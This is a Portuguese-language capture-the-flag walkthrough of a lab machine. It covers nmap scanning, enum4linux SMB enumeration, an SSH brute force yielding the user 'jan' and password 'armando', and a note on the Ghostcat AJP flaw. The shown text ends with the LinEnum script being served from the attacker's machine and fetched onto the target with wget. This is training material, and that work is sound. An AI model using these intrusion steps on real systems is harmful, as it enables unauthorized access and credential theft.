Comecei como sempre fazendo um scan na máquina para verificar os serviços expostos na máquina.

```
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```

```
Stats: 0:03:41 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 91.67% done; ETC: 15:13 (0:00:00 remaining)
Nmap scan report for 10.10.64.179
Host is up (0.23s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8009/tcp open  ajp13?
8080/tcp open  http-proxy?
```

```
nmap -sV -O 10.10.133.219

Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-19 15:17 -03
Nmap scan report for 10.10.133.219
Host is up (0.29s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8080/tcp open  http        Apache Tomcat 9.0.7
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```



Fui até o servidor http e encontrei uma página com a seguinte mensagem:

![[Pasted image 20220312152520.png]]

Analisei então o código fonte do site para ver se descobria algo e o seguinte comentário apareceu

```
<!-- Check our dev note section if you need to know what to work on. -->
```

Foi ai que tive a ideia de colocar uma ferramenta para procurar por diretórios escondidos. Enquanto rodava o script, fui atrás de procurar por informações das outras portas. Comecei pela porta 8009: ajp13.

AJP é um protocolo que permite que um servidor standalone converse com o tomcat e forneça conteúdo estático. No [site](https://book.hacktricks.xyz/pentesting/8009-pentesting-apache-jserv-protocol-ajp) que eu procurei eu identifiquei que há uma vulnerabilidade chamada Ghostcat. Mais para frente ele explicou um pouco como funciona, mas neste momento, eu voltei para verificar os diretórios que foram encontrados.


```
---- Scanning URL: http://10.10.64.179/ ----
==> DIRECTORY: http://10.10.64.179/development/                                       
+ http://10.10.64.179/index.html (CODE:200|SIZE:158)                                  
+ http://10.10.64.179/server-status (CODE:403|SIZE:300)    
```

No diretório *development* eu encontrei dois arquivos texto. Analisando, eu encontrei:

No dev.txt:

```
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```

No j.txt

```
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```

Com isso, descobrimos que há um servidor rodando com o SMB. Já que há um sistema SMB, eu utilizei a enumeração do ```enum4linux -a 10.10.146.230``` e assim o seguinte resultado foi visto:

```
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Mar 12 23:30:47 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.146.230
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===================================================== 
|    Enumerating Workgroup/Domain on 10.10.146.230    |
 ===================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================= 
|    Nbtstat Information for 10.10.146.230    |
 ============================================= 
Looking up status of 10.10.146.230
        BASIC2          <00> -         B <ACTIVE>  Workstation Service
        BASIC2          <03> -         B <ACTIVE>  Messenger Service
        BASIC2          <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ====================================== 
|    Session Check on 10.10.146.230    |
 ====================================== 
[+] Server 10.10.146.230 allows sessions using username '', password ''

 ============================================ 
|    Getting domain SID for 10.10.146.230    |
 ============================================ 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================= 
|    OS information on 10.10.146.230    |
 ======================================= 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.146.230 from smbclient: 
[+] Got OS info for 10.10.146.230 from srvinfo:
        BASIC2         Wk Sv PrQ Unx NT SNT Samba Server 4.3.11-Ubuntu
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 ============================== 
|    Users on 10.10.146.230    |
 ============================== 
Use of uninitialized value $users in print at ./enum4linux.pl line 874.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.

Use of uninitialized value $users in print at ./enum4linux.pl line 888.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.

 ========================================== 
|    Share Enumeration on 10.10.146.230    |
 ========================================== 

        Sharename       Type      Comment
        ---------       ----      -------
        Anonymous       Disk      
        IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            BASIC2

[+] Attempting to map shares on 10.10.146.230
//10.10.146.230/Anonymous       Mapping: OK, Listing: OK
//10.10.146.230/IPC$    [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ===================================================== 
|    Password Policy Information for 10.10.146.230    |
 ===================================================== 


[+] Attaching to 10.10.146.230 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] BASIC2
        [+] Builtin

[+] Password Info for Domain: BASIC2

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 =============================== 
|    Groups on 10.10.146.230    |
 =============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:
^[[B^[[A^[[D
[+] Getting domain group memberships:

 ======================================================================== 
|    Users on 10.10.146.230 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================== 
^[[C[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-2853212168-2008227510-3551253869
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-21-2853212168-2008227510-3551253869 and logon username '', password ''
S-1-5-21-2853212168-2008227510-3551253869-501 BASIC2\nobody (Local User)
S-1-5-21-2853212168-2008227510-3551253869-513 BASIC2\None (Domain Group)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)

 ============================================== 
|    Getting printer info for 10.10.146.230    |
 ============================================== 
No printers returned.


enum4linux complete on Sat Mar 12 23:49:49 2022
```

Após realizar a busca por usuários, eu utilizei força bruta para buscar a senha e achei a seguinte:

```
[22][ssh] host: 10.10.146.230   login: jan   password: armando
```

Aproveitei para procurar a do kay também:

```

```

Enquanto procurava a senha, explorei a máquina do jan. Primeiro eu utilizei o netstat para listar os processos:

```
ctive Internet connections (w/o servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 ip-10-10-146-230.eu:ssh ip-10-9-2-93.eu-w:53528 TIME_WAIT  
tcp        0      0 ip-10-10-146-230.eu:ssh ip-10-9-2-93.eu-w:53516 TIME_WAIT  
tcp        0      0 ip-10-10-146-230.eu:ssh ip-10-9-2-93.eu-w:53508 TIME_WAIT  
tcp        0      0 ip-10-10-146-230.eu:ssh ip-10-9-2-93.eu-w:53514 TIME_WAIT  
tcp        0      0 ip-10-10-146-230.eu:ssh ip-10-9-2-93.eu-w:53504 TIME_WAIT  
tcp        0      0 ip-10-10-146-230.eu:ssh ip-10-9-2-93.eu-w:53518 TIME_WAIT  
tcp        0      0 ip-10-10-146-230.eu:ssh ip-10-9-2-93.eu-w:53510 TIME_WAIT  
tcp        0      0 ip-10-10-146-230.eu:ssh ip-10-9-2-93.eu-w:53512 TIME_WAIT  
tcp        0      0 ip-10-10-146-230.eu:ssh ip-10-9-2-93.eu-w:53520 TIME_WAIT  
tcp        0    300 ip-10-10-146-230.eu:ssh ip-10-9-2-93.eu-w:53456 ESTABLISHED
tcp        0      0 ip-10-10-146-230.eu:ssh ip-10-9-2-93.eu-w:53506 TIME_WAIT  
tcp        0      0 ip-10-10-146-230.eu:ssh ip-10-9-2-93.eu-w:53494 TIME_WAIT  
tcp        0      0 ip-10-10-146-230.eu:ssh ip-10-9-2-93.eu-w:53498 TIME_WAIT  
tcp        0      0 ip-10-10-146-230.eu:ssh ip-10-9-2-93.eu-w:53524 TIME_WAIT  
tcp        0      0 ip-10-10-146-230.eu:ssh ip-10-9-2-93.eu-w:53500 TIME_WAIT  
tcp        0      0 ip-10-10-146-230.eu:ssh ip-10-9-2-93.eu-w:53496 TIME_WAIT  
tcp        0      0 ip-10-10-146-230.eu:ssh ip-10-9-2-93.eu-w:53502 TIME_WAIT  
Active UNIX domain sockets (w/o servers)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  2      [ ]         DGRAM                    34516    /run/user/1001/systemd/notify
unix  7      [ ]         DGRAM                    9948     /run/systemd/journal/socket
unix  11     [ ]         DGRAM                    9955     /run/systemd/journal/dev-log
unix  2      [ ]         DGRAM                    9956     /run/systemd/journal/syslog
unix  2      [ ]         DGRAM                    16512    /var/lib/samba/private/msg.sock/1238
unix  3      [ ]         DGRAM                    9942     /run/systemd/notify
unix  2      [ ]         DGRAM                    14236    /var/lib/samba/private/msg.sock/897
unix  2      [ ]         DGRAM                    14245    /var/lib/samba/private/msg.sock/900
unix  2      [ ]         DGRAM                    14317    /var/lib/samba/private/msg.sock/959
unix  3      [ ]         STREAM     CONNECTED     13153    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     34544    
unix  2      [ ]         DGRAM                    14830    
unix  3      [ ]         STREAM     CONNECTED     13712    
unix  2      [ ]         DGRAM                    12562    
unix  3      [ ]         STREAM     CONNECTED     13713    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     13151    
unix  2      [ ]         DGRAM                    34402    
unix  3      [ ]         STREAM     CONNECTED     13152    
unix  3      [ ]         STREAM     CONNECTED     13081    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     13080    
unix  2      [ ]         DGRAM                    14877    
unix  2      [ ]         DGRAM                    10996    
unix  2      [ ]         DGRAM                    34508    
unix  3      [ ]         STREAM     CONNECTED     34543    
unix  2      [ ]         DGRAM                    34489    
unix  2      [ ]         STREAM     CONNECTED     16814    
unix  2      [ ]         DGRAM                    10618    
unix  3      [ ]         STREAM     CONNECTED     14488    
unix  3      [ ]         STREAM     CONNECTED     10814    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     14037    
unix  2      [ ]         DGRAM                    13183    
unix  3      [ ]         STREAM     CONNECTED     14038    /var/run/dbus/system_bus_socket
unix  3      [ ]         DGRAM                    12045    
unix  3      [ ]         STREAM     CONNECTED     13962    
unix  3      [ ]         DGRAM                    12044    
unix  2      [ ]         DGRAM                    13156    
unix  3      [ ]         STREAM     CONNECTED     13187    
unix  3      [ ]         STREAM     CONNECTED     10983    
unix  2      [ ]         DGRAM                    14303    
unix  3      [ ]         STREAM     CONNECTED     14139    
unix  3      [ ]         STREAM     CONNECTED     12033    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     13963    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     13628    
unix  3      [ ]         DGRAM                    12042    
unix  3      [ ]         STREAM     CONNECTED     13175    
unix  3      [ ]         STREAM     CONNECTED     13629    /run/systemd/journal/stdout
unix  3      [ ]         DGRAM                    12043    
unix  2      [ ]         DGRAM                    13269    
unix  3      [ ]         STREAM     CONNECTED     34481    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     10813    
unix  3      [ ]         STREAM     CONNECTED     34477    
unix  3      [ ]         STREAM     CONNECTED     10984    /run/systemd/journal/stdout
unix  3      [ ]         DGRAM                    11003    
unix  3      [ ]         STREAM     CONNECTED     12016    
unix  3      [ ]         STREAM     CONNECTED     14489    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     13188    /var/run/dbus/system_bus_socket
unix  2      [ ]         DGRAM                    10488    
unix  3      [ ]         STREAM     CONNECTED     13889    
unix  3      [ ]         STREAM     CONNECTED     14140    /var/run/dbus/system_bus_socket
unix  2      [ ]         DGRAM                    16523    
unix  3      [ ]         STREAM     CONNECTED     13890    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     13186    
unix  3      [ ]         DGRAM                    11004    
unix  3      [ ]         STREAM     CONNECTED     13189    /var/run/dbus/system_bus_socket
unix  2      [ ]         DGRAM                    12038
```

Mas em si eu não encontrei nada relevante. Por isso, eu tentei procurar por outra forma de tentar encontrar as portas. Primeiro eu baixei o ```LinEnum``` pelo diretório no github e depois verifiquei se a máquina alvo possuia um comando como wget usando ```which wget```.

Depois disso, eu utilizei o comando ```python3 -m http.server 80``` para iniciar um servidor na minha máquina.

Depois, na máquina eu utilizei o comando wget da seguinte maneira:

```wget http://X.X.X.X/LinEnum.sh```